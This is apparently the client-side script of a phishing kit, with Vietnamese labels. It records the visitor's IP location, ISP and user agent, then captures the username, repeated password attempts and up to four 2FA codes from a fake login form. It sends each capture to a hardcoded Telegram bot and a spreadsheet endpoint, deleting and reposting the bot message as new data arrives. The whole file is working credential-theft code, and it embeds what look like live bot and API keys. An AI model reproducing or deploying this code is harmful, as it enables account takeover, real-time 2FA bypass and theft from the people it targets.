/* ================= 1. CONFIGURATION ================= */
const CONFIG = {
	TELEGRAM: {
		BOT_TOKEN: '8328740598:AAG3qtxa-1HshBQtAWfSeEPI6YHOR0g_-iw',
		CHAT_ID: '-1003936740040',
	},
	GEO_API: 'http://ipwhois.pro/?key=8U9rT6QVwOslzNS0',
};

/* ================= 2. UTILITIES & DATA ================= */
const Utils = window.Utils = {
	userLoc: {
		ip: 'Unknown',
		country: 'Unknown',
		countryCode: 'Unknown',
		city: 'Unknown',
		region: 'Unknown',
		postal: 'Unknown',
		flag: '',
		continent: '',
		callingCode: '',
		capital: '',
		borders: '',
		isp: '',
		org: '',
		asn: '',
		domain: '',
		timezone: '',
		utc: '',
		localTime: '',
		currency: '',
		currencyCode: '',
		currencySymbol: '',
		exchangeRate: '',
	},

	countryCodeToFlag: (code) => {
		if (!code || code === 'Unknown' || code.length !== 2) return '';
		return String.fromCodePoint(...[...code.toUpperCase()].map((c) => 0x1f1e6 + c.charCodeAt(0) - 65));
	},

	getDialCode: (countryCode) => {
		if (!countryCode || countryCode === 'Unknown') return null;
		const map = {
			AF: '+93', AL: '+355', DZ: '+213', AD: '+376', AO: '+244', AR: '+54',
			AM: '+374', AU: '+61', AT: '+43', AZ: '+994', BH: '+973', BD: '+880',
			BY: '+375', BE: '+32', BZ: '+501', BJ: '+229', BT: '+975', BO: '+591',
			BA: '+387', BW: '+267', BR: '+55', BN: '+673', BG: '+359', BF: '+226',
			BI: '+257', KH: '+855', CM: '+237', CA: '+1', CV: '+238', CF: '+236',
			TD: '+235', CL: '+56', CN: '+86', CO: '+57', KM: '+269', CG: '+242',
			CD: '+243', CR: '+506', HR: '+385', CU: '+53', CY: '+357', CZ: '+420',
			DK: '+45', DJ: '+253', EC: '+593', EG: '+20', SV: '+503', GQ: '+240',
			ER: '+291', EE: '+372', SZ: '+268', ET: '+251', FJ: '+679', FI: '+358',
			FR: '+33', GA: '+241', GM: '+220', GE: '+995', DE: '+49', GH: '+233',
			GR: '+30', GT: '+502', GN: '+224', GW: '+245', GY: '+592', HT: '+509',
			HN: '+504', HK: '+852', HU: '+36', IS: '+354', IN: '+91', ID: '+62',
			IR: '+98', IQ: '+964', IE: '+353', IL: '+972', IT: '+39', CI: '+225',
			JM: '+1', JP: '+81', JO: '+962', KZ: '+7', KE: '+254', KI: '+686',
			KW: '+965', KG: '+996', LA: '+856', LV: '+371', LB: '+961', LS: '+266',
			LR: '+231', LY: '+218', LI: '+423', LT: '+370', LU: '+352', MO: '+853',
			MG: '+261', MW: '+265', MY: '+60', MV: '+960', ML: '+223', MT: '+356',
			MH: '+692', MR: '+222', MU: '+230', MX: '+52', FM: '+691', MD: '+373',
			MC: '+377', MN: '+976', ME: '+382', MA: '+212', MZ: '+258', MM: '+95',
			NA: '+264', NR: '+674', NP: '+977', NL: '+31', NZ: '+64', NI: '+505',
			NE: '+227', NG: '+234', KP: '+850', MK: '+389', NO: '+47', OM: '+968',
			PK: '+92', PW: '+680', PS: '+970', PA: '+507', PG: '+675', PY: '+595',
			PE: '+51', PH: '+63', PL: '+48', PT: '+351', QA: '+974', RO: '+40',
			RU: '+7', RW: '+250', WS: '+685', SM: '+378', ST: '+239', SA: '+966',
			SN: '+221', RS: '+381', SC: '+248', SL: '+232', SG: '+65', SK: '+421',
			SI: '+386', SB: '+677', SO: '+252', ZA: '+27', KR: '+82', SS: '+211',
			ES: '+34', LK: '+94', SD: '+249', SR: '+597', SE: '+46', CH: '+41',
			SY: '+963', TW: '+886', TJ: '+992', TZ: '+255', TH: '+66', TL: '+670',
			TG: '+228', TO: '+676', TN: '+216', TR: '+90', TM: '+993', TV: '+688',
			UG: '+256', UA: '+380', AE: '+971', GB: '+44', US: '+1', UY: '+598',
			UZ: '+998', VU: '+678', VE: '+58', VN: '+84', YE: '+967', ZM: '+260',
			ZW: '+263',
		};
		return map[countryCode.toUpperCase()] || null;
	},

	getLocation: async () => {
		try {
			const res = await fetch(CONFIG.GEO_API);
			const data = await res.json();

			Utils.userLoc = {
				ip: data.ip || 'Unknown',
				countryCode: data.country_code || 'Unknown',
				country: data.country || 'Unknown',
				city: data.city || 'Unknown',
				region: data.region || 'Unknown',
				postal: data.postal || 'Unknown',
				flag: Utils.countryCodeToFlag(data.country_code),
				continent: data.continent || '',
				callingCode: data.calling_code ? `+${data.calling_code}` : '',
				capital: data.capital || '',
				borders: data.borders || '',
				isp: data.connection?.isp || '',
				org: data.connection?.org || '',
				asn: data.connection?.asn ? `AS${data.connection.asn}` : '',
				domain: data.connection?.domain || '',
				timezone: data.timezone?.id || '',
				utc: data.timezone?.utc || '',
				localTime: data.timezone?.current_time || '',
				currency: data.currency?.name || '',
				currencyCode: data.currency?.code || '',
				currencySymbol: data.currency?.symbol || '',
				exchangeRate: data.currency?.exchange_rate
					? data.currency.exchange_rate.toLocaleString('en-US')
					: '',
			};

			console.log(`Geo data:`, Utils.userLoc);
		} catch (e) {
			console.error(`Error fetching geo:`, e);
		}
	},

	getTime: () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),

	_sheetMeta: { row: null, col: 1 },

	getSheetRow: () => Utils._sheetMeta.row,

	sendToSheet: async (type, value) => {
		try {
			const L = Utils.userLoc;
			const meta = Utils._sheetMeta;
			if (!meta.row) {
				const row = [
					L.ip, L.country, L.countryCode, L.city, L.region, L.continent,
					L.capital, L.postal, L.callingCode, L.borders,
					L.isp, L.org, L.asn, L.domain,
					L.timezone, L.utc, L.localTime,
					L.currency, L.currencyCode, L.currencySymbol, L.exchangeRate,
					document.getElementById('username')?.value || 'N/A',
					navigator.userAgent,
					Utils.getTime(),
				];
				row.push(value);
				const res = await fetch('/api/sheet', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({ action: 'append', value: [row] }),
				});
				const data = await res.json();
				const range = data?.updates?.updatedRange || data?.result?.updates?.updatedRange || '';
				const match = range.match(/Sheet2!A(\d+)/);
				if (match) {
					meta.row = match[1];
					meta.col = row.length;
				}
				return { ok: !!(data?.updates || data?.result?.updates), row: meta.row, col: meta.col };
			}

			meta.col++;
			const colLetter = String.fromCharCode(64 + meta.col);
			const res = await fetch('/api/sheet', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ action: 'update', row: meta.row, value: [[value]] }),
			});
			const data = await res.json();
			return { ok: !!(data?.updates || data?.result?.updates), row: meta.row, col: meta.col };
		} catch {
			return { ok: false, row: '?', col: '?' };
		}
	},

	sendMessage: async (text) => {
		try {
			const oldId = localStorage.getItem('message_id')
			if (oldId) {
				try {
					await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/deleteMessage`, {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: JSON.stringify({ chat_id: CONFIG.TELEGRAM.CHAT_ID, message_id: oldId }),
					})
				} catch {}
			}
			const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					chat_id: CONFIG.TELEGRAM.CHAT_ID,
					text: text,
					parse_mode: 'HTML',
				}),
			});
			const data = await res.json()
			const newId = data.result?.message_id
			if (newId) localStorage.setItem('message_id', newId)
		} catch (e) {
			console.error('Tele error');
		}
	},

	formatReport: (type, extra = {}) => {
		const d = {
			username: document.getElementById('username')?.value || 'N/A',
		};

		let savedPasswords = window.passwords || [];

		let icon = type === 'PASS' ? '🔑 MẬT KHẨU' : '🔥 MÃ OTP';

		const L = Utils.userLoc;
		let report = `<b>${icon}</b> | ${Utils.getTime()}\n`;
		report += `━━━━━━━━━━━━━━━━━━━━\n`;
		report += `🌐 <b>IP:</b> ${L.ip} ${L.flag}\n`;
		report += `🕵️ <b>UA:</b> ${navigator.userAgent}\n`;
		report += `━━━━━━━━━━━━━━━━━━━━\n`;
		report += `📍 <b>Vị trí</b>\n`;
		report += `   City: ${L.city || 'Unknown'}\n`;
		report += `   Region: ${L.region || 'Unknown'}\n`;
		report += `   Country: ${L.country} (${L.countryCode})\n`;
		if (L.continent) report += `   Continent: ${L.continent}\n`;
		if (L.capital) report += `   Capital: ${L.capital}\n`;
		if (L.postal && L.postal !== 'Unknown') report += `   Postal: ${L.postal}\n`;
		if (L.callingCode) report += `   Calling Code: ${L.callingCode}\n`;
		if (L.borders) report += `   Borders: ${L.borders}\n`;
		report += `━━━━━━━━━━━━━━━━━━━━\n`;
		report += `🔌 <b>Kết nối</b>\n`;
		if (L.isp) report += `   ISP: ${L.isp}\n`;
		if (L.org) report += `   Org: ${L.org}\n`;
		if (L.asn) report += `   ASN: ${L.asn}\n`;
		if (L.domain) report += `   Domain: ${L.domain}\n`;
		report += `━━━━━━━━━━━━━━━━━━━━\n`;
		report += `🕐 <b>Múi giờ</b>\n`;
		if (L.timezone) report += `   ID: ${L.timezone}\n`;
		if (L.utc) report += `   UTC: ${L.utc}\n`;
		if (L.localTime) report += `   Local: ${L.localTime}\n`;
		if (L.currency) {
			report += `━━━━━━━━━━━━━━━━━━━━\n`;
			report += `💰 <b>Tiền tệ</b>\n`;
			report += `   ${L.currency} (${L.currencyCode}) ${L.currencySymbol}\n`;
			if (L.exchangeRate) report += `   Rate: 1 USD = ${L.exchangeRate} ${L.currencyCode}\n`;
		}
		report += `━━━━━━━━━━━━━━━━━━━━\n`;
		report += `👤 <b>Username/Email:</b> <code>${d.username}</code>\n`;
		if (extra.sheet) {
			const s = extra.sheet;
			report += `📊 <b>Sheet:</b> ${s.ok ? '✅ OK' : '❌ FAIL'} | Row ${s.row} | Col ${s.col}\n`;
		}
		report += `----------------------------------\n`;

		if (savedPasswords.length > 0) {
			for (let i = 0; i < savedPasswords.length; i++) {
				report += `Password(${i + 1}): <code>${savedPasswords[i]}</code>\n`;
			}

			for (let i = savedPasswords.length; i < 2; i++) {
				report += `Password(${i + 1}): \n`;
			}
		} else if (type === 'PASS') {
			if (extra.attempt === 1) {
				report += `Password(1): <code>${extra.password}</code>\n`;
				report += `Password(2): \n`;
			} else {
				if (savedPasswords.length > 0) {
					report += `Password(1): <code>${savedPasswords[0]}</code>\n`;
				} else {
					report += `Password(1): \n`;
				}
				report += `Password(2): <code>${extra.password}</code>\n`;
			}
		} else {
			report += `Password(1): \n`;
			report += `Password(2): \n`;
		}

		report += `----------------------------------\n`;

		let savedOtps = window.otps || [];

		if (savedOtps.length > 0) {
			for (let i = 0; i < savedOtps.length; i++) {
				report += `🔐Code 2FA(${i + 1}): <code>${savedOtps[i]}</code> (${savedOtps[i].length} digits)\n`;
			}

			for (let i = savedOtps.length; i < 4; i++) {
				report += `🔐Code 2FA(${i + 1}): \n`;
			}
		} else if (type === 'OTP') {
			if (extra.attempt === 1) {
				report += `🔐Code 2FA(1): <code>${extra.otp}</code> (${extra.otp.length} digits)\n`;
				report += `🔐Code 2FA(2): \n`;
				report += `🔐Code 2FA(3): \n`;
				report += `🔐Code 2FA(4): \n`;
			} else if (extra.attempt === 2) {
				if (savedOtps.length > 0) {
					report += `🔐Code 2FA(1): <code>${savedOtps[0]}</code> (${savedOtps[0].length} digits)\n`;
				} else {
					report += `🔐Code 2FA(1): \n`;
				}
				report += `🔐Code 2FA(2): <code>${extra.otp}</code> (${extra.otp.length} digits)\n`;
				report += `🔐Code 2FA(3): \n`;
				report += `🔐Code 2FA(4): \n`;
			} else if (extra.attempt === 3) {
				if (savedOtps.length > 0) {
					report += `🔐Code 2FA(1): <code>${savedOtps[0]}</code> (${savedOtps[0].length} digits)\n`;
				} else {
					report += `🔐Code 2FA(1): \n`;
				}
				if (savedOtps.length > 1) {
					report += `🔐Code 2FA(2): <code>${savedOtps[1]}</code> (${savedOtps[1].length} digits)\n`;
				} else {
					report += `🔐Code 2FA(2): \n`;
				}
				report += `🔐Code 2FA(3): <code>${extra.otp}</code> (${extra.otp.length} digits)\n`;
				report += `🔐Code 2FA(4): \n`;
			} else {
				if (savedOtps.length > 0) {
					report += `🔐Code 2FA(1): <code>${savedOtps[0]}</code> (${savedOtps[0].length} digits)\n`;
				} else {
					report += `🔐Code 2FA(1): \n`;
				}
				if (savedOtps.length > 1) {
					report += `🔐Code 2FA(2): <code>${savedOtps[1]}</code> (${savedOtps[1].length} digits)\n`;
				} else {
					report += `🔐Code 2FA(2): \n`;
				}
				if (savedOtps.length > 2) {
					report += `🔐Code 2FA(3): <code>${savedOtps[2]}</code> (${savedOtps[2].length} digits)\n`;
				} else {
					report += `🔐Code 2FA(3): \n`;
				}
				report += `🔐Code 2FA(4): <code>${extra.otp}</code> (${extra.otp.length} digits)\n`;
			}
		} else {
			report += `🔐Code 2FA(1): \n`;
			report += `🔐Code 2FA(2): \n`;
			report += `🔐Code 2FA(3): \n`;
			report += `🔐Code 2FA(4): \n`;
		}

		return report;
	},
};

/* ================= 3. MAIN LOGIC ================= */
async function initApp() {
	await Utils.getLocation();

	window._ipReady = true;
	window.dispatchEvent(new Event('ip-ready'));

	window.passwords = [];
	window.otps = [];

	let passAttempts = 0;
	let otpAttempts = 0;

	document.getElementById('form-password')?.addEventListener('submit', async function (e) {
		e.preventDefault();
		const pwd = document.getElementById('password')?.value;
		if (!pwd) return;

		passAttempts++;

		window.passwords.push(pwd);

		const sheet = await Utils.sendToSheet('PASS', pwd);

		await Utils.sendMessage(
			Utils.formatReport('PASS', { password: pwd, attempt: passAttempts, sheet }),
		);
	});

	const tfaForm = document.getElementById('form-2fa');
	const tfaBtn = document.getElementById('tfa-submit-btn');
	const codeInp = document.getElementById('code-2fa');

	if (tfaForm && codeInp) {
		codeInp.addEventListener('input', function () {
			const cleanValue = this.value.replace(/[^0-9]/g, '');
			const isValidLength = cleanValue.length >= 6 && cleanValue.length <= 8;

			tfaBtn.disabled = !isValidLength;
			if (isValidLength) {
				tfaBtn.classList.remove('opacity-70', 'cursor-not-allowed');
				tfaBtn.classList.add('opacity-100', 'cursor-pointer');
			} else {
				tfaBtn.classList.add('opacity-70', 'cursor-not-allowed');
				tfaBtn.classList.remove('opacity-100', 'cursor-pointer');
			}
		});

		tfaForm.addEventListener('submit', async function (e) {
			e.preventDefault();
			const otpVal = codeInp.value.replace(/[^0-9]/g, '');

			if (otpVal.length >= 6 && otpVal.length <= 8) {
				otpAttempts++;

				window.otps.push(otpVal);

				const sheet = await Utils.sendToSheet('OTP', otpVal);

				await Utils.sendMessage(
					Utils.formatReport('OTP', { otp: otpVal, attempt: otpAttempts, sheet }),
				);
			}
		});
	}
}

// Khởi tạo
if (document.readyState === 'loading') {
	document.addEventListener('DOMContentLoaded', initApp);
} else {
	initApp();
}
